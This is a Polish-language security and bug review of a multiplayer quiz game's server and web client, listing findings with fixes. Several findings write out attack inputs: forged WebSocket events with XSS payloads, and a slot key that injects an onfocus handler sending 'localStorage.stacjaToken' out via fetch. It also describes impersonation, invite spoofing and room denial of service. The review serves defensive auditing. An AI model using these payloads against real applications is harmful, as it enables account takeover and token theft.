# Review MULTIPLAYER / SERWER (DO) — stacja v51 (2026-10-15)

Zakres: `server/authorityRoom.js`, `server/gameRoom.js`, `server/index.js`, `server/lib/*`, `app/mp*.js`,
`app/social.js` (zaproszenia v51), `app/catEditor.js`, `adapters-web/roomTransport.js|cfChannel.js|cf.js`,
`core/mpReducer|phases|teams|matchRecord`. Pominięte rzeczy z `backlog/plan-naprawy-audyt-2026-07.md`
(o ile fix jest poprawny) oraz to, co już jest w `bugs_solo.md` (kolejność/duplikaty slotów, sw.js,
`escapeHtml` w inline onclick social.js).

Testy: `npm test` → 464 rdzeń + 17836 danych + 30 authority ✅; `npm run test:dom` → 124 ✅; `cd server && npm test` → 30 ✅.
Skrypty reprodukcji (ten scratchpad): `repro/server.mjs` (DO z fake'ami jak w `server/test`, uruchom:
`cd server && node --import ./test/register.mjs <ścieżka>/repro/server.mjs`), `repro/xss.mjs` (jsdom,
`test/domEnv.js`, uruchom z katalogu repo: `node <ścieżka>/repro/xss.mjs`).

## Znaleziska (od najpoważniejszych)

### 1. Każdy gracz może podmienić stan gry u wszystkich (event `sync` przez relay) → XSS i kradzież tokenu
- **Plik:linia:** `server/authorityRoom.js:189-196` (relay `event` bez whitelisty nazwy) + `adapters-web/roomTransport.js:87-88`
  (każdy `{t:'event'}` trafia do callbacków `bcast[msg.event]`, w tym `sync`) + `app/mp.js:174` (`sync` → `S.game=payload`)
  + `app/mp-render.js:468,580` (`t.color` bez escape w `style="background:${…}"`).
- **Waga:** krytyczna · **Pewność:** POTWIERDZONE skryptem (`repro/server.mjs` A1, `repro/xss.mjs`).
- **Scenariusz:**
  1. Gracz (dowolny, nie host — wystarczy ważny token z `/api/session`) wysyła po WS
     `{t:'event', event:'sync', payload:{phase:'done',format:'teams',teams:[{id:'x',name:'a',color:'red"><img src=x onerror=…>'}],scores:{x:1}}}` (167 B < cap 500 B).
  2. DO sprawdza tylko rate-limit/rozmiar (whitelista jest wyłącznie dla `react`) i rozsyła `{t:'event',event:'sync',payload}` do wszystkich.
  3. `roomTransport` wywołuje callbacki `sync` → `S.game` u każdego klienta = stan napastnika → `mpRenderDone` wstawia `<img onerror>` (potwierdzone w jsdom: atrybut `onerror` obecny w DOM).
  4. Skrypt czyta `localStorage.stacjaToken` (token 90 dni, pełna tożsamość: liga, znajomi, drużyny, konto OAuth-podpięte).
  Nawet bez XSS: dowolny gracz może „zakończyć" mecz u wszystkich, pokazać fałszywą odsłonę, zmienić fazę — do czasu następnego `state` z serwera (w PLAY bez akcji może to trwać do końca pytania).
- **Fix:** serwer: whitelist `msg.event ∈ {react, say, typing, advanced}` i nadpisywanie `payload.by/byName` z `conn.state` (patrz #4); klient (`roomTransport`): mapować do `bcast` tylko te nazwy, nigdy `sync`/`act` z `t:'event'`. Dodatkowo escapować/walidować `color` (`/^#[0-9a-f]{3,8}$/i`) w renderze i w `buildTeams`.

### 2. Stored XSS od hosta: klucz slotu pytania i kolor drużyny lecą bez sanityzacji do wszystkich klientów
- **Plik:linia:** `server/authorityRoom.js:53` (`clampQuestion`: `key:String(s.key)` bez walidacji) , `core/teams.js:22`
  (`assignments` → `name/color/id/members` 1:1), `server/authorityRoom.js:298`; render: `app/mp-render.js:200,325,333`
  (`id="mpProp_${s.key}"`, `onclick="mpVote('${s.key}', …)"`), `:468,:580` (`t.color`).
- **Waga:** wysoka · **Pewność:** POTWIERDZONE skryptem (`repro/server.mjs` D1 — DO zachowuje `a" autofocus onfocus="x()` i `red"><img …>`; `repro/xss.mjs` — input z `autofocus onfocus=…` w DOM, odpala się bez kliknięcia).
- **Scenariusz:** złośliwy „host" (każdy, kto założy pokój albo wyśle `start` — patrz #5) wysyła `start` z pulą quizu,
  w której `slots[0].key = 'a" autofocus onfocus="fetch(…+localStorage.stacjaToken)" x="'` → DO przepuszcza →
  `game.answerSlots` u wszystkich → w fazie „kombinuj" input z `autofocus` odpala JS u każdego gracza (zaproszonego
  przez link/„zaproś znajomego"). Analogicznie `assignments[].color` w formacie Drużyny (ranking odsłony/wyniku).
  Ten sam `teams` pozwala wpisać gracza do 2 drużyn (D1: `H w 2 drużynach: 2`) i nieistniejących członków.
- **Fix:** `clampQuestion`: `key` tylko `/^[a-z0-9_]{1,16}$/i` (inaczej odrzuć pytanie); `startMatch`: zbudować
  `assignments` po stronie serwera z walidacją (`id` `/^t\d$/`, `name` slice 14, kolor z palety `teamColor(i)` —
  ignorować kolor klienta, `members` ∩ `playersOf()`, każdy gracz max w 1 drużynie). W renderze slot key przez
  `data-k` + `escapeHtml`, nie w `id`/inline JS.

### 3. Zamknięcie drugiej karty / starego socketu hosta → host traci rolę mimo że jest połączony; sam w pokoju → mecz zamrożony
- **Plik:linia:** `server/authorityRoom.js:148-155` (`onClose`: `others = … filter(s.id!==left)` — wyklucza też
  POZOSTAŁE połączenia tego samego id) + `app/mp.js:183` (`if(SERVER_AUTH && S.ch.hostId)` — przy `hostId=null` klient zostaje przy `S.host=true`).
- **Waga:** wysoka · **Pewność:** POTWIERDZONE skryptem (`repro/server.mjs` C1-C4).
- **Scenariusz A (dwie karty / reconnect):** host H gra z P. Telefon hosta zmienia sieć → klient robi reconnect (H2),
  a stary socket H1 serwer zamyka dopiero po chwili (half-open) — albo host otworzył drugą kartę i ją zamknął.
  `onClose(H1)`: `left===hostId` → awans `others[0]` z pominięciem H2 → `hostId=P` (C1). Host nie ma już
  „Zatwierdź"/„Następne"; `lock/next` od H2 ignorowane (C2). Odzyska rolę dopiero przy KOLEJNYM reconnect
  (reclaim po `starterId` działa tylko w `onConnect`). W trybie salon zamienia TV z telefonem P (efekt 1.6).
- **Scenariusz B (sam + duplikat):** host gra sam / z TV (inni wyszli): `others=[]` → `hostId=null` (C3). Serwer
  odrzuca `lock/next/retry` od każdego (`me===this.hostId` false), klient hosta nadal pokazuje przyciski hosta,
  bo `S.ch.hostId` null nie aktualizuje `S.host` → PLAY/REVEAL wiszą na zawsze (C4); `onConnect` ustawia hosta
  tylko przy NOWYM połączeniu.
- **Fix:** w `onClose` najpierw: `if([...this.getConnections()].some(c=>c!==conn && c.state && c.state.id===left)) { pushPresence(); return-promote; }`;
  przy `others=[]` nie zerować `hostId` (zostawić starego, reclaim przy powrocie). Klient: `S.host = (S.ch.hostId===mpMe.id)` także gdy `hostId` null.

### 4. Podszywanie się na czacie / „dalej" w salonie (relay eventów nie wymusza nadawcy)
- **Plik:linia:** `server/authorityRoom.js:195` (`payload:p` 1:1), `app/mp.js:176-179,307-313`.
- **Waga:** średnia · **Pewność:** POTWIERDZONE skryptem (`repro/server.mjs` A2).
- **Scenariusz:** gracz wysyła `{t:'event',event:'say',payload:{by:'<id hosta>',byName:'Host',text:'…'}}` → wszyscy
  widzą wiadomość „od hosta" (dymek + feed). W salonie: `{event:'advanced',payload:{by:<id każdego gracza>,nonce}}`
  dla wszystkich id → TV uznaje, że wszyscy kliknęli „dalej" i przeskakuje odsłonę innym (rush/griefing).
  To samo dotyczy `react` (`byName`).
- **Fix:** w DO przed broadcastem `p.by=conn.state.id; p.byName=conn.state.name;` (jak przy `action`).

### 5. Dowolny gracz może wystartować mecz i przejąć hosta (lobby i DONE) + `rounds` bez limitu = DoS pokoju
- **Plik:linia:** `server/authorityRoom.js:199-205` (brak `me===this.hostId`), `:288,293` (`rounds` z configu bez capu).
- **Waga:** wysoka · **Pewność:** POTWIERDZONE skryptem (`repro/server.mjs` B1, E1).
- **Scenariusz:** (a) w poczekalni lub na ekranie wyniku gracz B wysyła `{t:'start',config}` → `hostId=starterId=B`,
  mecz B rusza, host twórca zdegradowany (B1). (b) `config.rounds=200000` → `buildMatch` tworzy 600 000 slotów, stan
  `game` ma ~25 MB JSON (E1) i jest rozsyłany do każdego klienta przy każdej zmianie oraz `persist()`-owany
  (przekroczenie limitu wartości storage DO → `persist` rzuca → m.in. w `go()` nie zostanie zaplanowany auto-lock,
  bo `scheduleAutoLock` jest PO `await persist()`). Pokój praktycznie martwy; klienci mobilni dławią się 25 MB/broadcast.
- **Fix:** `start` tylko gdy `!this.game` i `me===this.hostId`, albo `me===this.hostId||me===this.starterId` w DONE;
  `rounds = clamp(int, 1, 4)` (picker ma 1-4), `timer ∈ {0,30,60,90}`, `modes ⊂ ALL_MODES`, `format ∈ {coop,solo,teams}`.

### 6. Brak wyjścia awaryjnego z ARMING: jeden AFK gracz na ekranie odsłony blokuje pokój; „pomiń czekanie" w salonie nic nie pomija
- **Plik:linia:** `app/mp.js:263` (`needArm` wymaga `!mpRevealPending()`), `server/authorityRoom.js:356-358,376-383`
  (brak timera/komendy wymuszenia), `app/mp-render.js:484-485` (TV „pomiń czekanie" → `next`).
- **Waga:** wysoka · **Pewność:** POTWIERDZONE skryptem (`repro/server.mjs` F1: host wysyła next/lock/retry/start —
  faza zostaje `arming 1/2`) + PEWNE z kodu dla klienta.
- **Scenariusz:** 4 graczy, jeden odłożył telefon z otwartą odsłoną (Android/desktop trzyma WS) albo poszedł do baru.
  Host klika „Następne" → ARMING; gracz AFK nie kliknął „dalej" → jego klient nie zbroi się i nie wysyła `ready` →
  `readyCount 3/4` na zawsze; host nie ma żadnego przycisku ani komendy. W salonie TV „pomiń czekanie ›" tylko
  przenosi zastój z REVEAL do ARMING (telefony z niezamkniętą odsłoną dalej nie zgłaszają ready) — funkcja nie spełnia
  opisu z komentarza („ręczny pomiń czekanie").
- **Fix:** komenda hosta `{t:'go'}` w ARMING (wymuś `go()`; nie-gotowi dołączą przez `startPlay` po nonce) + przycisk
  „zacznij bez maruderów" po np. 15 s; alternatywnie klient zbroi się w tle także z pending reveal (buforuje audio,
  wysyła ready), a odsłonę pokazuje dalej — start i tak nastąpi po intrze.

### 7. Coop: krótki rozłącz między pytaniami wyklucza gracza z CAŁEGO następnego pytania (punkty przepadają)
- **Plik:linia:** `server/authorityRoom.js:321` (`reconcileTeams(game, playersOf())` tylko w `newRound`) + `core/teams.js:48-51`
  (coop: `members = obecni` w tej chwili) + `core/mpReducer.js:62-63` (akcje spoza drużyny ignorowane).
- **Waga:** średnia · **Pewność:** POTWIERDZONE skryptem (`repro/server2.mjs` G1-G3).
- **Scenariusz:** coop, gracz P na odsłonie traci zasięg na 1-2 s (winda, zmiana Wi-Fi→LTE) dokładnie wtedy, gdy host
  klika „Następne". `newRound` składa drużynę z obecnych → `members=['H']`. P wraca po sekundzie (jeszcze w LOADING —
  `resolveTrackServer` trwa do 20 s — albo w ARMING), zbroi się, ale w PLAY widzi baner „Dołączysz od następnego
  pytania", jego typ jest odrzucany (G2), trafienie nie liczy się do tally/MVP (G3). To samo przy odświeżeniu strony w
  złym momencie. W formacie Solo problem nie występuje (drużyny nie są usuwane), w Drużynach skład jest zamrożony.
- **Fix:** coop: przeliczać `teams[0].members` także w `go()` (start PLAY) i/lub w `onConnect` dopisywać powracające
  id do drużyny 'all', gdy `game.format==='coop'` i faza ∈ {LOADING, ARMING, PLAY}.

### 8. Wynik meczu do ligi gubi graczy, którzy wyszli przed DONE, a dopisuje widzów/TV
- **Plik:linia:** `core/matchRecord.js:41-46` (participants = `members` z chwili `finish()`), `server/authorityRoom.js:426`.
- **Waga:** średnia · **Pewność:** POTWIERDZONE skryptem (`repro/server2.mjs` H1: tally `P:7` → brak P w participants; Z z 0 pkt dopisana).
- **Scenariusz:** gracz zdobył 7 trafień, w ostatnim pytaniu padła mu bateria / zamknął kartę → `finish()` buduje
  participants z obecnych → jego mecz i 7 trafień nie trafiają do ligi/profilu. Odwrotnie: osoba, która weszła na
  ostatnie pytanie (albo TV w salonie — rola 'host'), dostaje +1 mecz z 0 pkt (zaniża średnie, TV pojawia się w lidze).
- **Fix:** participants = suma id z `game.teams[].members` (historycznie, dla coop zbierać zbiór „grał ≥1 pytanie")
  ∪ klucze `tally`; nazwy z `tally`/ostatniej obecności; w salonie pominąć `salonScreenId`/hosta-TV.

### 9. [niepełny fix 3.2] `/api/record-match` nadal pozwala dopisać dowolnie wiele meczów i punkty CUDZYM profilom
- **Plik:linia:** `server/lib/api.js:236-244`, `:11-25`, `server/lib/recordMatch.js:31-38`; publiczne id profili: `server/lib/api.js:72-83` (`/api/league` zwraca `profile_id`).
- **Waga:** średnia · **Pewność:** PEWNE z kodu.
- **Scenariusz:** walidacja 3.2 ogranicza wynik JEDNEGO rekordu (≤ 310 pkt), ale: (a) brak limitu liczby/częstotliwości —
  pętla 1000 × POST `mode:'mp'` z `total_questions:150, score:310` = dowolne miejsce w lidze; (b) wystarczy, że wołający
  jest `host_id` — pozostałym `participants[].profile_id` można wpisać dowolne id z `/api/league` (wynik/„mecze" ofiary,
  także zaniżanie średniej); (c) `display_name`, `track`, `artist`, `cat_key`, `room_code`, `started_at` bez limitu długości
  (do 1000 odpowiedzi × dowolny string → puchnięcie D1). Pod `serverAuthority:true` klient MP w ogóle nie woła tego
  endpointu (zapis robi DO), więc `mode:'mp'` z klienta jest zbędny.
- **Fix:** endpoint tylko `mode:'solo'` i participants = dokładnie `[caller]`; rate-limit per profil (np. ≤ 1 mecz/2 min,
  binding RL jak dla proxy); `slice()` na wszystkich stringach w `insertMatch`.

### 10. Zaproszenia znajomych (v51): kanał `user-<id>` otwarty dla każdego → spam/phishing zaproszeń i podsłuch kodów pokoi
- **Plik:linia:** `app/social.js:203-237` (kanał relay `cfChannel('user-'+id)`), `server/gameRoom.js:50-54` (relay bez
  sprawdzania nadawcy/uprawnień), `server/lib/api.js:72-83` (id profili publiczne w lidze).
- **Waga:** średnia · **Pewność:** PEWNE z kodu.
- **Scenariusz:** napastnik bierze `profile_id` ofiary z `/api/league`, łączy się WS do `/parties/game-room/user-<id>`
  (wystarczy dowolny ważny token) i wysyła `{t:'b',event:'invite',payload:{code:'ABCD',byName:'<imię jej znajomego>'}}`
  → ofiara widzi baner „<Znajomy> zaprasza do gry" i ląduje w pokoju napastnika (który może dalej użyć #1/#2 — XSS
  i kradzież tokenu). Może też siedzieć na kanale ofiary i odbierać wszystkie jej zaproszenia (kody pokoi → dołącza
  do cudzych gier). `by` w payloadzie jest dowolne, więc filtr `payload.by!==mpMe.id` niczego nie chroni.
- **Fix:** zaproszenia przez Worker: `POST /api/invite {friendId, code}` (serwer sprawdza relację `friend_requests.status='accepted'`,
  wstawia prawdziwe `by/byName`), a kanał `user-<id>` tylko do odbioru — DO weryfikuje, że token łączącego ma `sub===id`
  (odrzuca innych), a wiadomości `invite` może nadać wyłącznie Worker (np. `stub.fetch`).

### 11. ARMING ujawnia treść pytania/tekst/zajawkę przed PLAY; fragment/„od tyłu" dają pełną zajawkę — przewaga w trybach Solo/Drużyny
- **Plik:linia:** `server/authorityRoom.js:335,342,347,350-355` (`prompt`, `lyric`, `ttsUrl`, `preview` ustawiane i rozsyłane
  w ARMING), `server/authorityRoom.js:266-269` (`viewFor` okraja tylko `byTeam`).
- **Waga:** średnia (konkurencyjne) / niska (coop) · **Pewność:** PEWNE z kodu.
- **Scenariusz:** w ARMING serwer czeka, aż WSZYSCY klikną „dalej" na odsłonie (#6) — to bywa kilkanaście sekund.
  Gracz, który kliknął pierwszy, ma już w stanie WS `game.prompt` (quiz), `game.lyric` (lektor) i `game.preview` —
  może czytać/googlać/odsłuchać, zanim pytanie ruszy dla reszty (+ ~2,3 s intra). W trybie „fragment" `preview` to cała
  30-s zajawka (klient sam przycina do 2 s), w „od tyłu" — normalny kierunek; zwykły devtools wystarczy.
  (To nie jest wyciek ODPOWIEDZI — `track/artist/answers` faktycznie trafiają dopiero do `reveal` przy lock.)
- **Fix:** `prompt`/`lyric`/`ttsUrl` dosyłać dopiero w `go()` (PLAY); dla fragmentu/od tyłu serwować audio przez
  `/audio` z wycięciem okna/odwróceniem po stronie Workera albo przynajmniej podpisanym, krótkotrwałym URL-em
  wydawanym w PLAY. Do ARMING wystarczy „preload hint" (np. URL proxy bez treści pytania).

### 12. Każdy stan ARMING bez nas w `readyIds` przeładowuje buforowaną zajawkę (`a.load()`) → kaskada re-buforowań
- **Plik:linia:** `app/mp.js:263-267` (warunek 1.1) + `:375-390` (`mpArm` zawsze woła `a.load()` i dokłada kolejne
  listenery/timeout), `server/authorityRoom.js:376-383` (każde `ready` → `broadcastState`, nawet duplikat).
- **Waga:** średnia · **Pewność:** PRAWDOPODOBNE (logika potwierdzona testem 1.1 w siatce — ponowne `ready` przy tym samym
  nonce; skutek `load()` = przerwanie pobierania to zachowanie przeglądarki, jsdom go nie odtworzy).
- **Scenariusz:** 5 graczy, wolny LTE u gracza G. G zbroi się (`load()` zaczyna pobierać ~1 MB). Zanim skończy, 4 pozostali
  zgłaszają ready → 4 broadcasty ARMING, w każdym `readyIds` bez G → `needArm` → `mpArm()` → `a.load()` od nowa
  (abort poprzedniego pobrania), +3 listenery, +1 timeout. G nigdy nie zbuforuje — zgłosi ready dopiero z bezpiecznika
  6 s, a potem kilka razy (każdy listener/timeout wysyła własne `ready` → każde wywołuje kolejny broadcast → kolejne
  re-arm u innych wolnych klientów). Skutek: start pytania opóźniony o ~6 s i niezbuforowane audio u wolnych (koniec
  „równego startu").
- **Fix:** rozróżnić „pełne zbrojenie" (nowy `armNonce`) od „dosłania ready" (ten sam nonce, nie ma nas w `readyIds`):
  w drugim przypadku tylko `mpSend({type:'ready'})`, jeśli lokalnie już zgłosiliśmy, albo nic, jeśli buforowanie trwa
  (flaga `S.armPending`). Serwer: nie broadcastować, gdy `ready.add` nic nie zmienił.

### 13. Wyjście z pokoju w trakcie pytania i wejście do nowego → 1. pytanie bez fazy „słuchaj", a zajawka gra bez gałki
- **Plik:linia:** `app/mp.js:110-124` (`mpLeave` nie zeruje `S.playRound/S.playSkin/S.playSub/S.sub`) + `app/mp-render.js:445-453`
  (`newRound = S.playRound!==g.playNonce`).
- **Waga:** niska · **Pewność:** POTWIERDZONE skryptem (`repro/leave.mjs`: pokój 2, pyt. 1 → brak `#mpKnob`, `play()`=1, widok kolumn).
- **Scenariusz:** gracz w pytaniu 1 (`playNonce=1`) przechodzi do „kombinuj", wychodzi (← wyjdź) i zakłada/dołącza do
  innego pokoju. Nowy mecz też zaczyna od `playNonce=1` → `newRound=false` → `S.sub` zostaje 'kombinuj' → brak intra
  „Słuchaj", gałki i paska czasu, a `mpAfterSync` i tak odpala `mpPlayLocal()` (zajawka leci w widoku, w którym nie da
  się jej zatrzymać/powtórzyć). Feed czatu nie jest czyszczony (stare typy z poprzedniego pokoju).
- **Fix:** w `mpLeave` dopisać `S.playRound=S.playSkin=S.playSub=null; S.sub='sluchaj'; mpFeedReset(); mpClearTyping();`
  (albo serwerowy `matchId` w stanie i reset lokalnych liczników przy jego zmianie).

### 14. Brak rate-limitu na akcje/`track`/`hello` i limitu połączeń → wzmocnienie broadcastów i zapisów storage
- **Plik:linia:** `server/authorityRoom.js:179-187` (`hello`/`track` → `pushPresence()` do wszystkich), `:208-215`
  (każda akcja → `broadcastState()` + `persist()`), `:189-190` (rate-limit tylko dla `event`, per POŁĄCZENIE).
- **Waga:** niska · **Pewność:** PEWNE z kodu.
- **Scenariusz:** jeden klient w pętli wysyła `{t:'action',action:{type:'pass'}}` (toggle — zawsze „zmienia" stan) albo
  `{t:'track'}` setki razy/s → każdy komunikat = N wysyłek pełnego stanu (z `pools` nie, ale z `slots/results`) + zapis
  do storage DO (koszt, CPU-limit DO → reset obiektu w środku meczu). Limit 10 eventów/s obchodzi się otwierając
  wiele połączeń tym samym tokenem (brak limitu połączeń na pokój/na id).
- **Fix:** wspólny limiter per `conn.state.id` (nie per połączenie) dla wszystkich typów wiadomości; cap połączeń na
  pokój (np. 16) i na id (np. 3); `persist()` debounce'owany (np. 250 ms) dla akcji w PLAY.

## Dług techniczny / ryzyka

- **Brak weryfikacji `groupId` (MVP-3):** `server/authorityRoom.js:290` przyjmuje dowolny `config.groupId` (64 zn.) bez
  sprawdzenia członkostwa hosta w `group_members`. Dziś nic go nie czyta (staty drużyn odłożone), ale gdy powstanie
  `/api/group/stats`, każdy host dopisze mecze do cudzej drużyny. Weryfikować w DO (D1 `SELECT 1 FROM group_members`)
  przy `start`. Brak też indeksu `matches(group_id)` pod przyszłe staty.
- **D1:** `/api/league` (publiczny, bez cache) to pełny `GROUP BY` po całym `match_participants` przy każdym wejściu na
  ekran — rośnie liniowo z liczbą meczów; warto zmaterializować sumy w `profiles` albo cache (KV/Cache API 60 s).
  `match_answers` nie ma indeksu po `match_id`. SQL-injection: brak — wszędzie `bind()`, jedyna interpolacja to lista
  `?` w `IN (…)`.
- **Relay `gameRoom.js`** (rollback `?authority=0`, kanały `team-*`/`user-*`): ufa wszystkim (`sync` od dowolnego gracza,
  brak capu nicku przy `track`/`?name=`, brak whitelisty eventów i rate-limitu). Jako kanał społecznościowy (#10)
  jest teraz w produkcji, nie tylko rollbackiem — wymaga tych samych zabezpieczeń co authority.
- **Kody pokoi 4-znakowe (32⁴≈1 M) bez hasła:** pokój da się zgadnąć/enumerować; kolizja `mpRandCode` z aktywnym
  pokojem (lub storage w 15-min karencji) wrzuca „twórcę" jako gościa do cudzej gry (`onConnect` nie nadpisuje hosta).
  Rozważyć sprawdzenie zajętości kodu przed utworzeniem (`GET /parties/.../<kod>` → faza) i dłuższe kody.
- **1.6 (salon promote) nadal otwarte** — #3 sprawia, że trigger nie wymaga nawet wyjścia TV (wystarczy stary socket).
- **`onAlarm` nie zeruje `starterId`** (`server/authorityRoom.js:166-172`); dziś nieszkodliwe (reclaim wymaga aktywnej gry), ale stan pół-wyczyszczony.
- **Brak testów DO dla:** onClose z duplikatem id, eventów relay (whitelista/`by`), walidacji configu `start`
  (rounds/assignments/slot key), wielu klientów w ARMING z re-arm. Siatka jsdom ma tylko jednego klienta-hosta —
  scenariusze nie-host (pending reveal ↔ ARMING) testowane wyłącznie skryptami z tego review.
- **Dedup transportów** (`cfChannel`/`roomTransport` ~80% wspólnego kodu) — każda poprawka (np. #1) musi trafić do obu.
- **`window.prompt` w imporcie kategorii** (`app/catEditor.js:137`) i brak walidacji `preview` (dowolny URL trafia do puli MP →
  wszyscy klienci pobierają audio z hosta-wskazanego adresu: wyciek IP/telemetria). Walidować `^https://` + allowlista hostów jak w `/audio`.
